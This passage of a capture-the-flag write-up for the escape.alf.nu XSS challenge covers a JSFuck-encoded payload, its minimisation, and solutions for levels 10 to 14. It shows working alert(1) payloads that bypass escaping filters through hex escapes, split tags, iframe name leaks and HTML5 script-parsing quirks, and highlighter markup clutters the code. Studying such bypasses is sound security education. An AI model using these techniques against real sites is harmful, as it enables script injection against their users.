class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(+{}+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]])())[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]])()([<span class="link_label"></span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]][<span class="link_label">([</span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]]((!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(+{}+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+[<span class="link_label"></span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]][<span class="link_label">([</span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]]((!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(+{}+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]	[<span class="link_label">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label">+!![</span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]])())[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])))())//</div></pre></td></tr></table></figure>

<p>We can also try to use our own minimization using the letters in “false”, “true”, “undefined” and “object”:</p>
<ul>
<li>false =&gt; ![]</li>
<li>true =&gt; !![]</li>
<li>undefined =&gt; [][[]]</li>
<li>NaN =&gt; +[![]]</li>
<li>0 =&gt; +[]</li>
<li>1 =&gt; +!+[]</li>
<li>2 =&gt; !+[]+!+[]</li>
<li>10 =&gt; [+!+[]]+[+[]]</li>
<li>Array =&gt; []</li>
<li>Number =&gt; +[]</li>
<li>String =&gt; []+[]</li>
<li>Boolean =&gt; ![]</li>
<li>Function =&gt; [][“filter”]</li>
<li>eval =&gt; [][“filter”]<a href="CODE">“constructor”</a>()7</li>
<li>window =&gt; [][“filter”]<a href="&quot;return this&quot;">“constructor”</a>()<br>来源： <a href="http://www.jsfuck.com/" target="_blank" rel="external">http://www.jsfuck.com/</a></li>
</ul>
<p>Strings we will need:</p>
<ul>
<li>sort<br>  [(”+!1)[3]+(”+{})[1]+(”+!0)[1]+(”+!0)[0]]</li>
<li>constructor<br>  [(”+{})[5]+(”+{})[1]+(”+{}[0])[1]+(”+!1)[3]+(”+!0)[0]+(”+!0)[1]+(”+!0)[2]+(”+{})[5]+(”+!0)[0]+(”+{})[1]+(”+!0)[1]]</li>
<li>alert(1)<br>  (”+!1)[1] + (”+!1)[2] + (”+!1)[4] +(”+!0)[1]+(”+!0)[0]+”(1)”</li>
</ul>
<p>We will replace the call to alert(1) in our payload:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">"+<span class="function">alert</span>(1))<span class="comment">//</span></div></pre></td></tr></table></figure>

<p>with the following one so we can simplify the encoding to encode strings.</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">"+[<span class="link_label"></span>][<span class="link_reference">"sort"</span>][<span class="link_label">"constructor"</span>](<span class="link_url">"alert(1</span>)")()//</div></pre></td></tr></table></figure>

<p>Note: Many other alternatives are possible like:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">"+(0)[<span class="link_label">'constructor'</span>][<span class="link_reference">'constructor'</span>]("alert(1)")()//</div></pre></td></tr></table></figure>

<p>But I found the “sort” one to be the shortest (with other 4 letter functions like “trim”)</p>
<p>This is a 246 characters solution:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">"+[<span class="link_label"></span>][<span class="link_reference">(''+!1)[3</span>]+(''+{})[<span class="link_label">1</span>]+(''+!0)[<span class="link_label">1</span>]+(''+!0)[<span class="link_label">0</span>]][(''+{})[5]+(''+{})[1]+(''+</div><div class="line">{}[0])[1]+(''+!1)[3]+(''+!0)[0]+(''+!0)[1]+(''+!0)[2]+(''+{})[5]+(''+!0)[0]+</div><div class="line">(''+{})[<span class="link_label">1</span>]+(''+!0)[<span class="link_label">1</span>]]((''+!1)[1] + (''+!1)[2] + (''+!1)[4] +(''+!0)[1]+</div><div class="line">(''+!0)[0]+"(1)")())//</div></pre></td></tr></table></figure>

<p>We can improve it by defining a variable containing all our letters and then just referencing it:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">_=''+!1+!0+{}[0]+{} = "falsetrueundefined[object Object]"</div><div class="line"></div><div class="line">");<span class="emphasis">_=''+!1+!0+{}[0]+{};[][_</span>[<span class="link_label">3</span>]+<span class="emphasis">_[19]+_</span>[<span class="link_label">6</span>]+<span class="emphasis">_[5]][_</span>[23]+<span class="emphasis">_[19]+_</span>[10]+_[3]+</div><div class="line"><span class="emphasis">_[5]+_</span>[<span class="link_label">6</span>]+<span class="emphasis">_[7]+_</span>[<span class="link_label">23</span>]+<span class="emphasis">_[5]+_</span>[<span class="link_label">19</span>]+<span class="emphasis">_[6]](_</span>[1]+<span class="emphasis">_[2]+_</span>[4]+<span class="emphasis">_[6]+_</span>[5]+'(1)')()//</div></pre></td></tr></table></figure>

<p>Now the solution is 144 characters which is still far from the winners:</p>
<p>Next iteratation is to change the base payload for something sorter like window.alert(1) In chrome, we can leak a reference to window with:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(0,<span class="attr_selector">[]</span><span class="attr_selector">["concat"]</span>)()<span class="attr_selector">[0]</span></div></pre></td></tr></table></figure>

<p>So using the same strings as above we get the following 100 characters solution:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">");<span class="emphasis">_=""+!1+!0+{}[0]+{};(0,[][_</span>[23]+<span class="emphasis">_[19]+_</span>[10]+<span class="emphasis">_[23]+_</span>[1]+_[5]])</div><div class="line">()[<span class="link_label">0</span>][<span class="link_reference">_[1</span>]+<span class="emphasis">_[2]+_</span>[<span class="link_label">4</span>]+<span class="emphasis">_[6]+_</span>[<span class="link_label">5</span>]](1)//</div></pre></td></tr></table></figure>

<p>We are still taking too many chars for defining our alphabet. Here is where Mario surprised me once again with this tweet:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">");(<span class="emphasis">_=!1+URL+!0,[][_</span>[<span class="link_label">8</span>]+<span class="emphasis">_[11]+_</span>[<span class="link_label">7</span>]+<span class="emphasis">_[8]+_</span>[<span class="link_label">1</span>]+<span class="emphasis">_[9]])()[0][_</span>[1]+_[2]</div><div class="line">+<span class="emphasis">_[4]+_</span>[<span class="link_label">38</span>]+_[<span class="link_label">9</span>]](1)//</div></pre></td></tr></table></figure>

<p>Note that he is using !1+URL+!0 as the alphabet string and it difers for different browsers:</p>
<p>Firefox:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">_=!<span class="number">1</span>+URL+!<span class="number">0</span>=<span class="string">"falsefunction URL() {</span></div><div class="line"> [native code]</div><div class="line"> }true<span class="string">"</span></div></pre></td></tr></table></figure>

<p>Chrome:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">_=<span class="exclamation_mark">!</span><span class="number">1</span>+<span class="variable">URL</span>+<span class="exclamation_mark">!</span><span class="number">0</span>=<span class="string">"falsefunction URL() { [native code] }true"</span></div></pre></td></tr></table></figure>

<p>Other interesting Mario ’s finding is that inside with-statements, almost everything leaks [object Window] for example:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">with</span><span class="params">(<span class="number">0</span>)</span> <span class="title">x</span>=[].<span class="title">sort</span>,<span class="title">x</span><span class="params">()</span></span></div></pre></td></tr></table></figure>

<h3 id="Level_10:">Level 10:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> {</span></div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">htmlEscape</span><span class="params">(s)</span> {</span></div><div class="line">		<span class="keyword">return</span> <span class="transposed_variable">s.</span>replace(/./g, <span class="function"><span class="keyword">function</span><span class="params">(x)</span> {</span></div><div class="line">		<span class="keyword">return</span> { <span class="string">'&lt;'</span>: <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>: <span class="string">'&gt;'</span>, <span class="string">'&'</span>: <span class="string">'&'</span>, <span class="string">'"</span><span class="string">': '</span><span class="string">"'</span>, <span class="string">"'</span><span class="string">": '''</span> }<span class="matrix">[x]</span> || x;</div><div class="line">	 });</div><div class="line">}</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">expandTemplate</span><span class="params">(template, args)</span> {</span></div><div class="line">	<span class="keyword">return</span> <span class="transposed_variable">template.</span>replace( /{(\w+)}/g,</div><div class="line">	<span class="function"><span class="keyword">function</span><span class="params">(_, n)</span> {</span></div><div class="line">		<span class="keyword">return</span> htmlEscape(args<span class="matrix">[n]</span>);</div><div class="line">	});</div><div class="line">}</div><div class="line">	<span class="keyword">return</span> expandTemplate(</div><div class="line">		<span class="string">" \n\</span></div><div class="line">   			&lt;h2&gt;Hello, &lt;span id=name&gt;&lt;/span&gt;!&lt;/h2&gt; \n\</div><div class="line">		 &lt;script&gt; \n\</div><div class="line">			var v = document.getElementById('<span class="transposed_variable">name'</span>); \n\</div><div class="line">			<span class="transposed_variable">v.</span>innerHTML = <span class="string">'&lt;a href=#&gt;{name}&lt;/a&gt;'</span>; \n\</div><div class="line">		&lt;\/script&gt; \n\</div><div class="line">  			 <span class="string">",</span></div><div class="line">  			 { name : s }</div><div class="line">   		);</div><div class="line">  	 }</div></pre></td></tr></table></figure>

<p>Injection takes place in a JS string context and since “\” is not escaped in the htmlEscape function, we can use hex or octal encoding for the “&lt;” symbol and bypass the escaping function.</p>
<p>Valid solutions:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">\x3csvg <span class="variable">onload=</span>alert(<span class="number">1</span>)</div><div class="line"></div><div class="line">   	\<span class="number">74</span>svg <span class="variable">onload=</span>alert(<span class="number">1</span>)</div></pre></td></tr></table></figure>

<h3 id="Level_11:">Level 11:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{</span></span></div><div class="line">   		<span class="comment">// Spoiler for level 2</span></div><div class="line">   		s = <span class="built_in">JSON</span>.stringify(s).replace(<span class="regexp">/&lt;\/script/gi</span>, <span class="string">''</span>);</div><div class="line">   		<span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log('</span> + s + <span class="string">');</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>';</div><div class="line">   	}</div></pre></td></tr></table></figure>

<p>I’ve seen similar escaping functions in real applications, normally it is not a good idea to fix the input data, you either accept it or reject it but trying to fix it normally leads to bypasses. In this case the escape function replaces “&lt;/script” with an empty string so shortest solution is:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="tag">&lt;/&lt;/<span class="attribute">scriptscript</span>&gt;</span><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">alert(<span class="number">1</span>)<span class="comment">//</span></span></span></div></pre></td></tr></table></figure>

<h3 id="Level_12:">Level 12:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{</span></span></div><div class="line">	<span class="comment">// Pass inn "callback#userdata"</span></div><div class="line">	<span class="keyword">var</span> thing = s.split(<span class="regexp">/#/</span>);</div><div class="line">	<span class="keyword">if</span> (!<span class="regexp">/^[a-zA-Z\[\]']*$/</span>.test(thing[<span class="number">0</span>])) <span class="keyword">return</span> <span class="string">'Invalid callback'</span>;</div><div class="line">	<span class="keyword">var</span> obj = {<span class="string">'userdata'</span>: thing[<span class="number">1</span>] };</div><div class="line">	<span class="keyword">var</span> json = <span class="built_in">JSON</span>.stringify(obj).replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>);</div><div class="line">	<span class="keyword">return</span> <span class="string">"&lt;script&gt;"</span> + thing[<span class="number">0</span>] + <span class="string">"("</span> + json +<span class="string">")</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>";</div><div class="line">}</div></pre></td></tr></table></figure>

<p>Similar to level 7 but this time the backslash is also escaped so we use a similar vector with a different way to comment the junk out:</p>
<p>Solution:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'#'</span>;alert(<span class="number">1</span>)&lt;!<span class="comment">--</span></div></pre></td></tr></table></figure>

<p>It will render:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"><span class="string">'({"userdata":"'</span>;alert(<span class="number">1</span>)&lt;!--<span class="string">"})</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<h3 id="Level_13:">Level 13:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">  	<span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{</div><div class="line">  		<span class="keyword">var</span> tag = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</div><div class="line">  		<span class="comment">//For this one, you get to run any code you want,but in a "sandboxed" iframe.</span></div><div class="line"> 		 <span class="comment">//</span></div><div class="line">  		<span class="comment">// http://print.alf.nu/?text=... just outputs whatever you pass in.</span></div><div class="line">  		<span class="comment">//</span></div><div class="line"><span class="comment">// Alerting from print.alf.nu won't count; try to trigger the one below.</span></div><div class="line">s = <span class="string">'&lt;script&gt;'</span> + s + <span class="string">'&lt;\/script&gt;'</span>;</div><div class="line">tag.src = <span class="string">'http://print.alf.nu/?html='</span> + <span class="built_in">encodeURIComponent</span>(s);</div><div class="line"><span class="built_in">window</span>.WINNING = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>{ youWon = <span class="literal">true</span>; };</div><div class="line">tag.onload = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>{</div><div class="line">  			f (youWon) alert(<span class="number">1</span>);</div><div class="line">  			};</div><div class="line">  			<span class="built_in">document</span>.body.appendChild(tag);</div><div class="line">  		}</div></pre></td></tr></table></figure>

<p>Iframes have a interesting feature: setting the name attribute on an iframe sets the name property of the iframe’s global window object to the value of that string. Now, the interesting part is that it can be done the other way around, so an iframe can define its own window.name and the new name will be injected in the parent’s global window object if it does not exist already (it cannot overwrite it). So if we fool the framed site to declare its window.name as “youWon”, a youWon variable will be setted in the parent global window object and so the “alert(1)” will be popped</p>
<p>Solution:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=<span class="string">'youWon'</span></div></pre></td></tr></table></figure>

<h3 id="Level_14:">Level 14:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">   	<span class="doctype">&lt;!DOCTYPE HTML&gt;</span></div><div class="line">function escape(s) {</div><div class="line">	function json(s) { </div><div class="line">		return JSON.stringify(s).replace(/\//g, '\\/'); </div><div class="line">	}</div><div class="line"></div><div class="line">	function html(s) { </div><div class="line">		return s.replace(/[<span class="tag">&lt;&gt;</span>"&]/g, function(s) {</div><div class="line">			return '&#' + s.charCodeAt(0) + ';'; </div><div class="line">		}); </div><div class="line">	}</div><div class="line">	return (</div><div class="line">		'<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"><span class="string">' +</span></span></div><div class="line">			'<span class="keyword">var</span> url = <span class="string">' + json(s) + '</span>; </div><div class="line">			<span class="comment">// We\'ll use this later ' + '</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>\n\n' +</div><div class="line">			' <span class="comment">&lt;!-- for debugging --&gt;</span>\n' +</div><div class="line">			' URL: ' + html(s) + '\n\n' +</div><div class="line">			'<span class="comment">&lt;!-- then suddenly --&gt;</span>\n' +</div><div class="line">			'<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">\n<span class="string">' +</span></span></div><div class="line">			' <span class="keyword">if</span> (!<span class="regexp">/^http:.*/</span>.test(url)) <span class="built_in">console</span>.log(<span class="string">"Bad url: "</span> + url);\n<span class="string">' +</span></div><div class="line">			' <span class="keyword">else</span> <span class="keyword">new</span> Image().src = url;\n<span class="string">' +</span></div><div class="line">		'<span class="tag">&lt;/<span class="title">script</span>&gt;</span>'</div><div class="line">		);</div><div class="line">   	}</div></pre></td></tr></table></figure>

<p>In order to solve this level we need to be familiar with an HTML5 parser “feature” when dealing with comments in JS blocks. This feature is well described in this post (thanks for the hint @cgvwzq !).</p>
<p>The trick is that injecting an HTML5 single line comment “!—” followed by a “”script”” open tag will move the parser into the “script data double escaped state” until the closing script tag is found and then it will transition into “ script data escaped state ” and it will treat anything from the end of the string where we injected the “”!—“scrip”” as JS! only thing we need to do is making sure there is a “—&gt;” so that the parser does not throw an invalid syntax exception.</p>
<p>So basically, if there is a “—&gt;” somewhere in the code (or we can inject it) we can fool the parser into processing HTML as JS. The string where we inject “”!—“script”” will still be considered as a JS string an everything following the string will become JS.</p>
<p>For this level we will make the JS engine to parse the HTML part (URL: xxx). In order to do so, we will start our payload with “alert(1)” so that the first JS evaluated will be “URL: alert(1)” then we want to comment out the remaining JS code so we will insert a multi-line comment start “/ ”. This way everything else will be commented out until we reach the “ /” present in the regexp; the code from that point on will be evaluated. In order to get a valid regexp we will also inject “if(/a/” before the multi-line comment start. So our payload will look like:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">alert(1);/<span class="keyword">*</span><span class="variable">&lt;!--&lt;script&gt;</span><span class="keyword">*</span>/if(/a//<span class="keyword">*</span></div></pre></td></tr></table></figure>

<p>The resulting code will be:</p>
<p><img src="http://evilddog.qiniudn.com/escape.alf.nu_3.png" alt=""></p>
<p>Now if we clean it up and remove the comments (in grey):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span></div><div class="line">	<span class="keyword">var</span> url = <span class="string">"alert(1);\/*&lt;!--&lt;script&gt;*\/if(\/a\/\/*"</span>;</div><div class="line">	URL: alert(<span class="number">1</span>); <span class="keyword">if</span>(<span class="regexp">/a/</span>.test(url)) <span class="built_in">console</span>.log(<span class="string">"Bad url: "</span> + url);</div><div class="line"> <span class="keyword">else</span> <span class="keyword">new</span> Image().src = url;</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<p>We can get it even shorter with:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(alert(<span class="number">1</span>)/*&lt;!<span class="comment">--&lt;script&gt;</span></div></pre></td></tr></table></figure>

<p>This will turn into:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span></div><div class="line">	<span class="keyword">var</span> url = <span class="string">"alert(1);\/*&lt;!--&lt;script&gt;*\/if(\/a\/\/*"</span>;</div><div class="line">	URL: <span class="keyword">if</span>(alert(<span class="number">1</span>).test(url)) <span class="built_in">console</span>.log(<span class="string">"Bad url: "</span> + url);</div><div class="line">	<span class="keyword">else</span> <span class="keyword">new</span> Image().src = url;</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<h3 id="Level_15:">Level 15:</h3>
